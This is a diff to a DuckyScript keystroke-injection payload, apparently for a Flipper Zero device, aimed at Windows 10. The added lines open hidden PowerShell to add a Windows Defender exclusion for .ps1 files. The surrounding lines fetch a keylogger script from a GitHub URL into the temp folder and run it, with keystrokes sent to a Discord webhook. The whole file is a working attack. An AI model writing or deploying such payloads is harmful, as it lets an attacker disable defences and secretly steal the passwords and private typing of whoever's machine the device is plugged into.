@@ -7,9 +7,14 @@ REM Target: Windows 10
 
 GUI r
 DELAY 500
+STRING powershell.exe -NoP -W Hidden -Exec Bypass -command "Add-MpPreference -ExclusionExtension 'ps1'"
+ENTER
+DELAY 500
+GUI r
 STRING CMD
 ENTER
 DELAY 500
+ENTER
 STRING powershell.exe -NoP -NonI -W Hidden -Exec Bypass -command "$Hook='ENTER_DISCORD_HOOK_HERE';$RunTime=60;$TimesRun=6;$DaysRun=0;Invoke-RestMethod https://raw.githubusercontent.com/Agente404/flipper/main/payloads/Keylogger2Discord/script.ps1 -OutFile ($env:temp+'\txtlog.ps1');Invoke-Expression ($env:temp+'\txtlog.ps1');"
 ENTER
 STRING exit
